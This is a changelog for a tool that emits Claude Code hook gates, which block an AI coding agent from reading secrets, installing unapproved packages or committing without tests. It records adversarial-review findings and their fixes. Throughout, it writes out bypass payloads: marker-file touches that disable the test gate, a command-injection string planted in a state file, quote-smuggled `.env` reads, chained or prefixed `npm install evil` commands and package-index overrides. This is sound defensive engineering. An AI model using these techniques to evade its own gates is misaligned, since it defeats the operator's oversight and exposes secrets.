Stated first because a changelog that only lists fixes is how the last two
rounds' regressions got past review.

- **REMOVED: the `test-gate` pass marker**, on both substrates. The gate used
  to skip the test run when `.claude/.last-test-pass` existed and no watched
  source file was newer. That file is gitignored, agent-writable, and
  protected by no gate — so `touch .claude/.last-test-pass`, through a Bash
  call every gate allows, disabled the test gate for the next commit
  (lens A F4). This is the P0-1 class (a gate trusting agent-writable state)
  reached by one word. *"Verify the contents instead"* is not a repair:
  whatever the gate can compute from the tree, an agent holding a Write tool
  can compute and write too. So there is no trusted input — **the tests now
  run on every `git commit` attempt**, bounded by the hook's existing 600 s
  timeout, exactly as `ci-mirror` already runs on every push. Removed with
  it: P2-5's staleness walk and backlog **I-5** (a divergence between two
  caches that no longer exist).
- **REMOVED: `permissions.deny` grew** `Write`/`Edit` rules for
  `.claude/.last-eval-pass` (ai-agent installs). `eval-gate` has no
  configured eval command to run in the marker's place, so its marker stays
  and is defended at the harness layer instead. A Bash `touch` still reaches
  it — the deny list carries no `Bash` rule — recorded as **J-9**.
- **NEWLY BLOCKED: run-without-installing channels.** `npx <pkg>`,
  `uvx <pkg>`, `pnpm dlx <pkg>`, `bunx <pkg>`, `npm exec <pkg>`,
  `yarn dlx <pkg>` now require the package to be on the `deps.md` approved
  list. The gate exists for *"unapproved software arrives"*, and not
  installing it first is not a mitigation. This is the batch's largest new
  false-positive surface (`npx tsc` on a local devDependency now needs an
  entry) — recorded as **J-13** rather than left to be discovered.
- **NEWLY BLOCKED: package-index overrides.** `PIP_INDEX_URL=…`,
  `NPM_CONFIG_REGISTRY=…` and nine siblings, when they are a command-position
  prefix of an install. These redirect even an **approved** package to
  another server, which no package-name check can see. Tested against the
  matched command head only, so prose naming the variable does not block.
- **CORRECTION (2026-07-29, round-2 review).** The heading below said "the
  batch's only relaxations, both in `secrets-gate`". **That was false, and it
  was the third consecutive round the same claim was false.** A parent-vs-head
  differential found at least four behaviours the parent blocked and that
  release allowed, three of them outside `secrets-gate`: the CLI spelling of
  a package-index override (`--index-url`/`-i`/`--registry`/`--find-links`/
  `--git`, while the environment-variable spelling in the bullet above was
  blocked from the same reason string); the dotenv-template exemption
  escaping *every* never-read pattern rather than the dotfile family, so
  `secrets/.env.example` was unguarded; a separator inside a quoted `git -c`
  option value defeating the command-position anchor; and any command wrapped
  in `sh -c '…'` becoming invisible to every directory-anchored pattern. All
  four are fixed. The lesson recorded, since the mechanism repeated: this
  inventory was written from *intent* — the relaxations the authors meant to
  make — and never from a diff, so a relaxation that arrived as a side effect
  could not appear in it. Freeze-exception no. 23 states its newly-blocked
  and newly-allowed sets from an executed parent-vs-head comparison instead.
- **NEWLY ALLOWED (as INTENDED at the time; see the correction above for what
  else slipped through).**
  (a) A quoted argument is one token, so `git commit -m "fix the .env
  loader"` and `git commit -m "docs: describe secrets/README"` no longer
  block — `RETROFIT.md:1134` scopes the mid-plan exception to *secrets*, not
  to prose containing the substring. (b) The conventional dotenv **template**
  basenames (`.env.example`, `.env.sample`, `.env.template`, `.env.dist`,
  `.env.defaults`, and the `env.`-prefixed spellings) are exact-matched and
  allowed on every surface; blocking a file whose entire purpose is to be
  read is the "operator deletes the gate" pressure the gate's own comments
  warn about. Exact basenames only: `.env.example.real` and `.env.production`
  are untouched. Both are pinned as explicit exemptions in the invariant
  matrix, not left implicit.

### Fixed

**Shared `_HOOK_HEADER`** (touches every emitted hook — which is why the
whole batch is one re-baseline):

- **F5 — a missing `grep` or `tr` silently turned every command gate into a
  no-op.** `cmd_has_verb`'s `grep -qE` sat inside an `if` condition and
  `norm_cmd`'s `tr` inside a command substitution. Both contexts are exempt
  from `set -e` and therefore from the `ERR` trap, so the fail-closed
  machinery never engaged: rc=0, no message, no log line, no `hook_fail`.
  Both helpers are pure bash now. This is the same class the `secrets-gate`
  header says was designed out (*"a pure-bash `shopt` cannot fail open that
  way"*) — the lesson had been applied to the pattern matcher and not to the
  two helpers every gate shares.
- **F2 — `norm_cmd` erased the newline as a command separator.**
  `tr -s '[:space:]' ' '` turned `\n` into a space while `cmd_has_verb`
  anchored on `(^|[;&|(])`, which does not contain a space, so any verb on a
  second line was unreachable: `git add -A\ngit commit -m wip` exited **0**
  on `spec-gate-commit`, `test-gate` and `ci-mirror`. Parsing is
  line-oriented now, which is what the SDK already did.
- **One segmentation mechanism, not two.** The new shared `cmd_segments`
  splits on newlines and `;&|()`, strips a trailing `#` comment, and is what
  both `cmd_has_verb` and `dependency-gate` consume. `dependency-gate`'s
  local newline split (added by `4cc9742`) is gone rather than left as a
  second mechanism. The command-position prefix also now admits `env`/`sudo`
  with their own flags, `VAR=value` runs and a tool path, so
  `env GIT_AUTHOR=x git commit` and `/usr/bin/git commit` match.
- **Lens B finding 3 — the `ERR` trap made `test-gate`'s rc dispatch
  unreachable.** `set +e` suppresses *exiting*; it does not disarm an `ERR`
  trap. `( <commands.test> ); rc=$?` fired `hook_fail` before the
  `if`/`elif`/`else` ran, so **every failing test suite** reported
  `BLOCKED (fail-closed): unexpected hook error at line 156` and the entire
  P2-5 fix (127 = toolchain missing vs. a real failure) was dead code — while
  §6.2 obliges a consumer to relay that reason faithfully, i.e. to tell the
  operator their red suite was a broken hook. Now `rc=0; ( … ) || rc=$?`: the
  left operand of `||` is exempt from both errexit and the trap. *Note for
  anyone reading lens A first: its "did not reproduce" entry for this trap
  varied the **payload** across 8582 runs; this trap fires on the exit status
  of the **configured** `commands.test`, which no payload reaches. Both
  results were correct; the conclusion "the trap never fires" was not.*
- **F10 / lens B 15 — spurious stderr on every hook's first run.** In
  `_rotate_log`, `wc -c <"$LOG" 2>/dev/null` applies redirections left to
  right, so the failing input redirection reported before `2>/dev/null` took
  effect, and a fresh install has no `.claude/logs/`. Guarded on `[ -f ]`.

**`secrets-gate`** (F1 and lens B finding 4 are the same twelve lines pulling
opposite ways — fixed together or not at all):

- **F1 — one newline disabled the whole Bash surface.** `read -ra _toks <<<
  "$_cmd"` consumes **one line**, so every token after the first newline was
  invisible: `cd /app\ncat .env` → rc=0 while `cd /app; cat .env` → rc=2.
  Multi-line is the *normal* shape of an agent's Bash call, so P0-2 was
  undone in ordinary use, no attacker required. Under-match is the
  catastrophic direction.
- **Lens B finding 4 — the same tokenizer blocked ordinary commands**, because
  splitting on whitespace made every word of a quoted argument a candidate
  path. Both are fixed by tokenizing the way a shell does: split on
  **unquoted** whitespace only, join adjacent quoted and unquoted runs into
  one token. A quoted argument is then one candidate; `cat ".env"` still
  resolves to `.env`.
- **F8 — token smuggling.** The one-deep quote strip did not survive
  intra-token quoting. Joining runs fixes `cat .en''v` and `cat 'sec'rets/…`
  for free; backslash-stripped and assignment-RHS candidates are emitted
  additionally, closing `cat .en\v` and `F=.env; cat $F`. `cat .en?` and
  `cat .{env}` require *evaluating* shell syntax and remain open — **J-11**.
- **Found by this batch's own corpus, in neither lens:** an unquoted shell
  operator stayed attached to the token, so `cd secrets; cat prod.yaml`
  yielded `secrets;` and matched nothing. Operators now delimit candidates.
- **F6 — `secrets` without a trailing slash was uncovered on both
  substrates.** `secrets/**` normalizes to `secrets/*`, which the anchored
  form matched only with the slash — so `Grep{"path":"secrets"}` returned
  matching file *contents*. The directory itself is a candidate now.
  `not-secrets/` and `docs/no-secrets/` still pass.

**`dependency-gate`:**

- **F9 — value-taking flags false-blocked, and named the wrong token.** Only
  seven flags consumed their value, so `pip install --index-url <url>
  requests` blocked and blamed the URL. The flag list is much longer now, but
  the safety does not rest on its completeness: **a flag consumes the next
  token only if that token is value-*shaped*** (a URL, `:all:`, a path, a
  `key=value`, a version). That inversion is what makes it safe to list short
  flags whose meaning differs by ecosystem — `npm install -f evil` and
  `npm install -d evil` still block `evil`, because `evil` is
  package-shaped. Two more `grep`/`sed` fail-open paths went with it.

**SDK substrate** — one audit: what did the shell get that this did not.

- **F7 — `secrets-gate` was not wired to `Bash`.** `settings.json` registered
  the shell gate on **both** `Bash` and the file matchers at v2.6.0;
  `_GATE_MATCHERS` carried only the second, so under `gate_substrate:
  "sdk-callable"` `cat .env`, `grep -r . secrets/` and `cat deploy.pem` were
  unguarded — the original P0-2 finding, unfixed on this substrate. New
  `_GATE_EXTRA_MATCHERS`, mirroring `HOOK_EXTRA_EVENTS`.
- **Lens B finding 8 — `ENFORCED_PREFIXES` was never ported**, so the
  bootstrap commit was still impossible under SDK dispatch: the half of P1-2
  the changelog reported as fixed.
- **Lens B finding 8 — the shell `eval-gate` was never anchored** while the
  SDK's was, so `echo "git push"` blocked on one substrate and not the other.
- **Two claims in the emitted module were false and are now true rather than
  softened.** The `_GATE_MATCHERS` comment (*"tests assert the two stay in
  sync"*) and the P2-1 binding rule (*"MUST NOT allow what the shell blocks,
  and MUST NOT block what the shell allows"*) — violated in both directions
  at once. The rule is now enforced by a test, not by a comment.

### Testing — the meta-fix

Two lenses independently concluded the findings existed because *the tests
were written from the same reading as the implementation*. Two structural
changes, not just more cases:

- **`tests/test_substrate_differential.py` (new, 85 checks).** One payload
  corpus pushed through **both** the emitted shell hooks (subprocess, exit
  code) and `build_hooks(RESOLVED_CONFIG)` (awaited, deny shape), asserting
  the verdicts are **identical** — and asserting the expected verdict too, so
  a case where both substrates are wrong the same way still fails. This is
  the test that would have caught F7; the "parity" test that existed compares
  reason-string *literals against the emitted body* and a matcher table
  against a matcher table, and runs no payload. **Verified: 32 failures
  against the pre-fix templates, 0 after.**
- **The invariant shape, extended to every gate touched.** `secrets-gate`'s
  Bash and file surfaces now carry the same append-only matrix the dependency
  gate got at `4cc9742` — *no command a previous version blocked may now be
  allowed, except the deliberate relaxations, which are listed* — with the
  two relaxations above as the complete exemption list. `test-gate` asserts
  the **emitted message** behaviourally (`tests failing (exit 3)`, `test
  command not found (exit 127)`, and the *absence* of `unexpected hook
  error`) instead of asserting a literal is present in the body.
- **Two tests that could not fail were replaced.**
  `test_sdk_gates.py`'s `"secrets-gate" not in getattr(gates_mod,
  "_BASH_GATES", {})` — a symbol that has never existed in this repo, so the
  `getattr` default made it unconditionally true, while backlog J-3 cited it
  as proof the divergence was "not silently tolerated". And
  `test_hook_behavior.py`'s P2-6 check, `"true" in code or "lint" in
  code.lower()`, against a body that always contains the word `lint` — and a
  fixture whose `format` and `lint` commands were both `"true"`, so even a
  correct substring check could not tell them apart. Both now assert
  something that can fail.
- **Verified to fail before the fixes:** 45 failures in
  `test_hook_behavior.py` and 32 in `test_substrate_differential.py` against
  the pre-fix templates; 0 after. Suite total 1235 → **1400 checks across 17
  suites**, 0 failed.

**Golden re-baseline: freeze-exception no. 19.** One re-baseline for the whole
batch — F1, F2, F5 and lens B finding 3 all live in the shared header, so any
one alone would move every hook. Measured against **plan actions** (what the
digest hashes), not the installed tree, which is the error no. 17's count
made: `default` 12 bodies, `full_autonomous` 17, `design_steering` 12; action
counts unchanged at 57/69/59; zero files added or removed. `settings.json`
moves on `full_autonomous` **only** (the eval-marker denies are emitted only
where `eval-gate` is). No steering doc, skill, command, agent body, wrapper
skeleton or spec template moves on any fixture — 42 and 44 frozen-twin
artifacts diffed, 0 moved.

### Corrections to the committed record

Each of these described behavior the code did not have. A committed document
that misdescribes a security gate is the P0-2 complaint itself, one layer up.

- `RETROFIT.md:1135` — *"Use `async: true` for slow hooks (>2 seconds)"*, the
  verbatim **pre-fix** recommendation, sitting inside a section headed
  *"Caveats (same as BOOTSTRAP §6.A)"* whose referent had already been
  corrected. P1-1 surviving in the retrofit twin.
- `RETROFIT.md:1162`, `Bootstrap-Protocol-v2-5-0.md:531` and `:419` — all
  still described `secrets-gate` as `PreToolUse` on Read/Write/Edit only.
- `Bootstrap-Protocol-v2-5-0.md:535` — named `.claude/logs/cost.jsonl` and
  claimed it records task ID, token spend and tool-call count. It is
  `session-events.jsonl` and records `{event, session_id, ts}`.
- `Bootstrap-Protocol-v2-5-0.md` test-gate bullet — described the marker file
  this batch removed.
- `SEAM-CONTRACT-v2-0-0.md:155` — §3.3 Coverage mapped the six denies to
  `Read|Write|Edit`/`Bash`/`Write`. Corrected, with the §8.4 walk above.
- `docs/changelog.md:165` and `docs/deferred-backlog.md:152` (J-4) — both
  said the repo has never been tagged. An annotated `v2.5.0` dated 2026-07-27
  is an ancestor of HEAD, so criterion 6 is satisfied for 2.5.0 and J-4's
  label as *"the release blocker"* rested on a premise the repo contradicts.
- `docs/deferred-backlog.md:142` — *"Every P0/P1/P2/P3 finding in that report
  was fixed at v2.6.0."* False when written: P2-4's Under half, P1-2's
  first-code-commit half and P2-5's message half were not.
- `docs/deferred-backlog.md:151` (J-3) — claimed `permissions.deny` guarded
  the shell-command route under SDK dispatch. The emitted deny list contains
  only `Read`/`Edit`/`Write` rules; Claude Code's path rules do not evaluate
  `Bash` command strings, so that route was guarded by **nothing**.
- `tests/test_greenfield_golden.py` freeze-exception **no. 17** — *"16 files
  on `default`"*. The digest hashes plan actions; the state file and manifest
  are written outside the plan. The digest moved over **14**.
- `docs/changelog.md` 2.6.0 entry — *"1201 checks"*; the suite reported 1202.

### Escalated, not decided

Two items are the owner's, and silently deciding an open owner decision is
the exact criticism lens B makes of the previous round. Both are written up
with options in `docs/deferred-backlog.md`; **current behavior is left in
place**.

- **A-5 (lens B finding 5) — retrofit fail-closed vs. the R8.A.6 warn-only
  ramp.** A-1 was closed for greenfield by the previous session, defensibly.
  It was not the implementer's to close for **retrofit**: on `mode: retrofit`
  with `ROLLOUT_WEEK: 1`, a parser outage blocks three gates in a week
  `RETROFIT.md:1250-1255` says blocks *"Nothing (warn-only mode)"*. The fix
  is mechanically available (the rollout week is read with `grep`, no parser
  needed), but whether brownfield *should* fail closed is a policy call.
  `secrets-gate` stays fail-closed unconditionally either way.
- **A-6 (lens B finding 6) — what `spec-gate-commit`'s predicate should be.**
  Scoping to `src/` fixes the bootstrap-commit half and *targets exactly* the
  files a behavior-oriented task corpus will never name, so the first **code**
  commit of every adopting project is still blocked. The upstream report
  escalated this as *"a design question for the maintainer, not just a
  patch."* It still is.

### Recorded, not fixed

`docs/deferred-backlog.md` cluster J gains **J-8** through **J-13**: P2-4's
Under half with an explicit statement of what was deliberately *not* done
(no project-boundary check, no traversal check, no content inspection, and no
widening of the default `never_read_paths` — that list is operator policy);
the surviving `.last-eval-pass` trust; two-step remote-script execution; the
glob/expansion classes a static command scan cannot reach; the
`git -c core.editor='vi x' commit` anchor gap; and the `npx` false-positive
surface this batch introduces. J-3 and J-5 are closed with their findings.

## 2.6.0 in-version fix — `dependency-gate` regressions (2026-07-28)

Source: `docs/lens-b-execution-findings-2026-07-28.md` findings 1 and 2. The
P1-3 rewrite below introduced three defects into the gate it was fixing. A
**differential sweep** — the same corpus through the `0ec72d0^` and `0ec72d0`
hook bodies, flagging every case the old version blocked and the new one
allowed — confirmed **ten** such commands. All ten now block on both
substrates.

**No `PROTOCOL_VERSION` bump.** This crosses the "changes whether a gate
blocks" line that the upstream report sets as the bar for a version decision
(acceptance criterion 5), but 2.6.0 is **unreleased** — the only tag in the
repo is `v2.5.0` (2026-07-27, an ancestor of HEAD). The defect never shipped
under a version number, so it is fixed in place. *(This also corrects the claim
made in the 2.6.0 entry below that the repo has never had a tag; it has.)*

- **1a — the extraction `sed` was greedy.** Its leading `.*` anchored on the
  **last** install verb on the line, so an earlier install in a chain was never
  inspected: `npm install evil && npm install requests` exited 0. The SDK had
  the mirror defect — `.search()` found the **first** — so the two substrates
  failed open on opposite halves of `A && B` and neither was safe.
- **1b — the lockfile-restore guard tested the whole line.** It asked whether
  the *command line* ended in a bare verb, not whether *this invocation* had no
  arguments, so a trailing `&& npm install`, `; cargo add` or even the comment
  `# npm install` blanked the package list and nothing was scanned at all. This
  is the stronger laundering primitive of the two: it needs no approved package.
- **1c / finding 2 — the command-position anchor admitted only a literal
  `env `.** `sudo pip install evil`, `FOO=1 npm install evil`,
  `uv pip install evil`, `/usr/bin/pip install evil`,
  `python3 -m pip install evil` and `pip3.11 install evil` all fell outside it;
  the v2.5.0 substring match had caught the first five.

**The fix is structural, not three regex patches.** All three defects share one
root: the gate treated a multi-command line as a single string and hunted for
"the" install command in it. Both substrates now **segment first** — split on
newlines and `;&|`, then run the anchored head test and token scan on each
segment independently, making the verdict the OR over segments. That resolves
1a, 1b and the comment variant together, and makes "no arguments" a
per-invocation fact rather than a property of the line. The shell does it in
pure bash (no external binary, so it cannot degrade if `tr` is missing). The
`curl … | sh` check still runs on the whole command *before* segmenting,
because that pattern deliberately reads across a pipe. The anchor now admits
`env`/`sudo` with their own flags, `VAR=value` runs, and a tool path.

**Accepted trade-off, recorded not buried (J-7):** a separator inside a quoted
string starts a new segment, so `git commit -m "fix; npm install evil"` blocks.
Deny-list bias is over-match; skipping unbalanced-quote segments would fix it in
the fail-open direction and was declined.

**Tests.** `tests/test_hook_behavior.py`'s dependency matrix is reframed as an
**invariant** rather than a case list — *no command a previous version blocked
may now be allowed, except the deliberate relaxations listed* — because the
v2.6.0 matrix was written from the upstream report's own examples and was
therefore structurally blind to what the rewrite broke. Both orderings of the
chained case are asserted on both substrates. Suite 1202 → **1235 checks**,
16 suites, 0 failed.

**Golden re-baseline: freeze-exception no. 18.** Exactly two emitted files move
on all three fixtures — `.claude/hooks/dependency-gate.sh` and
`.claude/sdk_gates/gates.py`. No shared header, no other gate, no
`settings.json`, no steering doc, skill, command or agent body; every frozen
twin stays byte-identical. Verified by differential install, not asserted.

## 2.5.0 → 2.6.0 (upstream security + gate-behavior fixes)

Source: `docs/bootstrap-protocol-upstream-bugs-2026-07-28.md` — a 6-lens
adversarial review of a **real v2.5.0 install** (greenfield `fullstack`, all
autonomous modes off, design steering + telemetry on, `gate_substrate:
"shell"`) that **executed** the emitted hooks with crafted payloads rather
than reading them. Static review of these same files had found neither the
RCE nor the dead-gate finding.

**Version classification (the report asks for this explicitly).** **MINOR,
not PATCH** — the emitted gates change *behavior*, not merely bytes:
`test-gate` and `ci-mirror` were `async` and therefore could not block at
all, and now do; a parser outage now fails closed where it used to allow.
**Not a seam event** — `SEAM-CONTRACT-v2-0-0.md` §8.4 lists **seven** triggers and
none fire: no §7.2 security-critical tier membership change (matchers and gate
behavior changed; §7.2 pins set *membership*, and no member was added or removed),
**no §7.3 provenance-marker or synthesize-file-contract change** (added
2026-07-30 — the enumeration previously walked six of the seven and claimed to
have walked the list), no §7.4 shared
sentinel change, no CLI entry point or contract-level flag, no §4.1/§5 table
change, no `binds` change. The new `permissions.deny` key sits inside
`settings.json`, already a §7.2 member. §8.4's own closing line governs: *"changes that
touch only gate internals or dispatch policy do not bump `seam_version`."*
`seam_version` stays 2.0.0; consumers need no re-pin.

### Priority 0 — security

- **P0-1 (CONFIRMED, RCE).** `drift-detector` incremented its counter with
  `n=$(( $(cat "$ST") + 1 ))`. Bash runs command substitution *inside*
  arithmetic evaluation, and `.claude/sessions/.drift-state-<sid>` is
  gitignored and writable by any ordinary `Write` call — so
  `PATH[$(touch /tmp/PWNED)]` in that file executed `touch` on the next
  PostToolUse event. A clean path from "the agent writes a file" (which no
  gate blocks) to arbitrary command execution, bypassing every `PreToolUse`
  `Bash` gate. Fixed by read → validate-as-unsigned-integer → add. **The
  class was audited, not just the instance:** every emitted artifact across
  all three autonomous modes was grepped for arithmetic over unvalidated
  file/JSON input; this was the only site.
- **P0-2 (CONFIRMED).** `secrets-gate` was registered only under
  `Read|Write|Edit`, so every never-read path stayed reachable through a
  shell command (`cat .env`, `grep -r . secrets/`, `git diff -- '*.pem'`)
  while `secrets.md` told the operator those paths were blocked. The gate now
  also guards `Bash` (each argument token treated as a candidate path, quotes
  stripped) and `NotebookEdit|Grep|Glob`. `settings.json` additionally gains a
  `permissions.deny` list mirroring the configured paths — defence in depth
  the harness enforces even if the hook fails.
- **P0-3 (CONFIRMED, three fail-open paths).** (a) The jq-less fallback
  passed the whole payload in an environment variable; Linux caps one env var
  at 128 KiB, so a 3 MB `Write` to `.env` failed exec, `|| true` swallowed it
  and the gate **allowed** — while the same payload with `jq` present blocked.
  It now receives the payload on its own stdin. (b) With neither `jq` nor
  `python3`, every gate fell through its `case` and allowed, silently. Gates
  now fail **closed** with a reason; advisory hooks declare `FAIL_CLOSED=0`
  and degrade to a logged no-op. (c) `mkdir`/`mktemp` failures died under
  `set -e` at exit 1 = "hook error, tool proceeds". Logging is now non-fatal,
  the pattern list uses `mapfile` instead of `mktemp`, and an `ERR` trap
  routes any unexpected failure through the fail-closed path.

  **This decides backlog A-1** ("emitted-gate fail-open posture under a total
  parser outage — leave inert vs. fail-closed"), which had been an open owner
  decision. `tests/test_retrofit.py` T2.FS7b asserted the old inert
  pass-through; its comment already flagged that as "a separate design
  decision". The guarantee that case exists for — a parser outage cannot
  fabricate the retrofit exemption — is unchanged and now stronger.

### Priority 1 — gates that did not do what the operator was told

- **P1-1 (CONFIRMED).** `test-gate`, `ci-mirror` and `format-lint-gate` were
  emitted with `"async": true`. **An async hook's exit code cannot block a
  tool call**, and its stderr is suppressed — so `test-gate` printed "Commit
  blocked: tests failing." and the commit went through. The protocol presents
  "implementation passes local gates" as gate 5 of 6; for these hooks that
  gate did not exist. Replaced with explicit timeouts (600 s / 900 s / 120 s).
  **The normative document was wrong too, not just the emission:**
  `Bootstrap-Protocol-v2-5-0.md` recommended `async: true` for the CI mirror —
  a gate whose whole purpose is to exit 2. Corrected in place at three sites.
- **P1-2 (CONFIRMED).** `spec-gate-commit` blocked **every possible first
  commit**, twice over: the bootstrap commit (harness files can never be
  spec-referenced — it blocked its own `INDEX.md`) and the first code commit
  (`spec-decompose` deliberately emits behaviors, not filenames). Plus
  unescaped ERE interpolation (`src/a+b.gleam`, listed verbatim, false-blocked
  because `+` is a quantifier) and an unquoted `$corpus` (a spec directory
  named `my spec` word-split and bricked all commits). The predicate is now
  scoped to implementation paths via an editable `ENFORCED_PREFIXES`,
  filenames are ERE-escaped, and the corpus is a quoted array.
- **P1-3 (CONFIRMED).** `dependency-gate` failed open on real installs and
  fired on prose. Fail-open: `gleam add`/`cargo add`/`mix deps.get`/`pipx`/
  `curl | sh` unmatched; `@evil/backdoor` blanked by `${tok%%[<>=@~ ]*}`;
  token laundering (`pip install pytest-mpi gleeunit` passed because the `i `
  inside `pytest-mpi` truncated the argument list); double-space and tab
  forms. False positives: bare `npm install` (lockfile restore) blocked, and
  any command merely *mentioning* an install phrase — which blocked the
  reviewing agent's own tool call mid-review. Rewritten: anchored verb
  matching, per-verb argument extraction (never chained strips), scope-aware
  package names, `set -f` + `read -ra` so tokens neither word-split nor glob.
- **P1-4 (CONFIRMED).** Four gates matched a fixed-spacing literal substring.
  `git  commit`, a tab, `git --no-pager commit` and `git -C /repo commit` all
  slipped through; conversely `git commit` inside a comment, a quoted string
  or a grep pattern fired the gate — which, once combined with P1-1's fix,
  would have turned a silent no-op into a multi-minute stall on innocuous
  commands. Fixing this **before** P1-1 was load-bearing, per the report's own
  sequencing. Shared `norm_cmd`/`cmd_has_verb`/`git_verb` helpers now anchor
  to command position. **Accepted trade-off, recorded rather than buried:** a
  verb inside a quoted argument to another program (`sh -c "git commit"`) no
  longer matches. Substring matching did catch that, at the cost of every
  false positive above.

### Priority 2 / 3

- **P2-1/P2-2/P2-3.** `gates.py` and the shell suite returned opposite
  verdicts on five dependency cases and on commits. **Decision recorded: the
  shell suite is canonical** (default substrate, ships everywhere). **Corrected
  2026-07-30 (v2.6.0 release review):** this sentence read "11 gates to the
  SDK's 7", which overstates it. A default install emits 11 hook *scripts*
  (`BASE_HOOKS` is 9, plus `secrets-gate` and `ci-mirror`), but three of those
  are loggers and alarms that gate nothing. The SDK module implements the same
  seven gates the shell suite enforces; what the shell adds is `spec-gate-entry`,
  `ci-mirror`, the drift detector and the session/alarm hooks. Both release
  documents enumerate the seven by name instead of counting. The SDK module is a
  consistent *subset* that must neither
  allow what the shell blocks nor block what the shell allows. The anchored
  matching, extended verb set, remote-script and requirements-file rules are
  ported; all 13 disputed cases now agree. The false "parity with the
  installed shell suite" claim is corrected, `git push` is documented as
  ungated under SDK dispatch, and the module states plainly that it is inert
  unless `gate_substrate: "sdk-callable"`.
- **P2-4.** `secrets-gate` over- and under-matched. The implicit leading `*`
  turned `.env*` into `*.env*` and hard-blocked `src/my.envelope.gleam` and
  `docs/dev.environment.md` mid-plan. Matching is now dot-segment aware, which
  keeps the T-1 requirement (`config.env`, `prod.env` still block) while
  dropping the word-interior false positives. `NotebookEdit` supplied
  `notebook_path`, which the hook never read — it reported success while
  checking nothing.
- **P2-5.** `test-gate` used a **relative** `find src` against an absolute
  marker, so in a project with no `src/` every commit passed with no test run,
  forever, once the marker existed. Now absolute, covers `src lib app test
  tests`, and distinguishes exit 127 (toolchain missing) from a real failure
  instead of reporting "tests failing" either way.
- **P2-6.** `format-lint-gate` ran the **mutating** `format` command (not
  `--check`) after every `Write|Edit` with no file-type filter, reformatting
  files the agent never touched. It now runs lint only.
- **P2-7.** The drift counter keyed on `CLAUDE_SESSION_ID`, which Claude Code
  does not export, so all sessions shared one never-resetting
  `.drift-state-default` — observed at 274 against a threshold of 50, firing
  on every tool call forever while invisible (PostToolUse stderr on exit 0 is
  not surfaced). Now read from the payload's `.session_id`, sanitised for
  path safety.
- **P2-8.** `spec-gate-entry` was dead code: its warning was guarded by
  `[ ! -s INDEX.md ]` and `INDEX.md` is always emitted non-empty, so the gate
  never once fired. It now checks for an actual spec directory.
- **P3 disclosure.** `audio_enabled=true` advertised a capability no emitted
  hook has (no player is ever invoked) → `false`. `cost.jsonl` recorded no
  cost → renamed `session-events.jsonl`. `.decision-pending-<sid>` was created
  and cleared by nothing → swept on the documented 7-day window.
  `hooks.log` had no rotation → rotates at 1 MiB. The jq-less fallback now
  renders `false` as empty, matching jq's `//` semantics exactly.

### Testing — a new class for this repo

`tests/test_hook_behavior.py` (**121 checks**) EXECUTES the emitted hooks
against a crafted-payload matrix and asserts exit codes. Every other suite
asserts emission determinism, which by construction cannot catch anything in
this report — a fully green 1016-check suite coexisted with an RCE and three
dead gates. Verified to fail before the fixes: 10 failures on the pre-fix
templates, 0 after. Suite total 1016 → **1202 checks across 16 suites**.
*(Corrected 2026-07-28, lens B finding 14: this line said 1201; the measured
total was 1202. A number in a release record has to match the artifact it
describes.)*

**Golden re-baseline: freeze-exception no. 17.** All three fixtures move; the
per-byte-class record is in `tests/test_greenfield_golden.py`. No steering
doc, skill, command or agent body changes, so every frozen twin
(`docs/{design,SKILL,design-review}.md`) stays byte-identical — verified.

### Not addressed

- The report's acceptance criterion 6 (**a tagged release**) is open for
  *this* version only. ~~this repo has never had a tag~~ — **corrected
  2026-07-28, lens B finding 13:** an annotated `v2.5.0` tag dated 2026-07-27
  points at an ancestor of HEAD, so criterion 6 is satisfied for 2.5.0 and
  merely pending for 2.6.0. Criterion 7 (re-run the two executing lenses
  against a fresh install of the fixed version) is the natural next step and
  is deliberately left to an independent reviewer.
- `ENFORCED_PREFIXES` (P1-2) is an editable constant in the emitted hook, not
  yet a `bootstrap.config.yaml` field.


## 2.4.0 → 2.5.0 (DS-01 design steering + release-review fixes)

The 2.5.0 span landed across five PRs; this entry is the release record the
span's own convention owes (every prior bump added one, plus a
`test_ic_gate` tripwire asserting it — both restored here after the final
release review found them missing).

- **DS-01 design steering (PR #13, merge `3967422`).** Opt-in
  `design_steering_enabled` (+ gated `design_review_skill_enabled`) wired as
  a TEL-01 twin across interview → config → emission → state, plus the one
  net-new mechanism: the archetype-gated interactive offer
  ({fullstack, mobile, ai-agent, platform, other}; the flag itself is
  accepted on any archetype — DELTA-02). Emits committed
  `.claude/steering/design.md` and, on the second opt-in, the advisory
  `design-review` skill + command (frozen bodies byte-verbatim from
  `docs/{design,SKILL,design-review}.md`). Off-by-default byte-identity
  golden-proven; `PROTOCOL_VERSION` 2.4.0 → 2.5.0 (installer, templates,
  plugin.json). Skill state field `and`-gated on the primary at
  `installer.py` so state can never disagree with emission.
- **UI/UX guide hardening (PRs #14 `854b47e` + #15 `e2c5a98`).** §1.5
  accessibility floor; DR-01 dead guide-pointer fixed in all three copies;
  DR2-02 target-size baseline disambiguated (AA = 24×24 CSS px; 44×44 is
  AAA); §6.6 de-forked to documentation-of-shipped.
- **DELTA-03 honest-scope clause (PR #16, merge `35c70b7`).** The emitted
  design-review skill gains the PRD/Companion-mandated honest-scope clause
  (design-time floor / advisory flag, not a compliance control; no
  substitute for legal review — FTC, EU Digital Fairness Act). Root cause:
  the implementation prompt (a lossy channel) folded only DELTA-01.
- **v2.5.0 release-review fixes (this PR).** A final holistic adversarial
  review (2026-07-27) of the tagged candidate against the PRD + Companion,
  including scratch-directory installs that *executed* the emitted hooks,
  produced three emitted-byte fixes — **golden freeze-exception no. 16**
  (all three fixtures re-baselined; zero files added/removed; counts stable
  57/69/59; changed set = every hook + `audio-alerts.config`, diff-verified
  vs HEAD; full record in `tests/test_greenfield_golden.py`):
  - **F3** — the `jget` Python fallback rendered booleans as `str(True)` =
    `"True"` where `jq -r` emits `"true"`, so every
    `[ "$(jget ...)" = "true" ]` guard — including the §6.D
    `stop_hook_active` loop guard in `cost-log` and `task-done-alarm` —
    silently failed open on jq-less installs. Booleans now render
    lowercase; runtime-verified with jq removed from PATH.
  - **F2/A-5** — `iteration-summary-enforcement` is wired as an
    unconditional `Stop` hook, so on goal-enabled installs every ordinary
    interactive session end errored rc=1 demanding a summary nothing
    writes. Now gated on a live `.goal-active-*` marker; enforcement inside
    a goal iteration unchanged. Residual stale-glob match recorded as
    backlog I-13.
  - **F1** — honest-scope corrections: `audio-alerts.config` no longer
    claims `drift_tier3_enforced=true` (nothing emitted writes a
    `.drift-tier3-*` sentinel or denies at tier 3) and now states that the
    emitted drift layer is a tier-1 tool-call notice only and that
    thresholds are baked at install time; the drift-detector and
    loop-cooperation hook comments say the same. The unimplemented §6.E
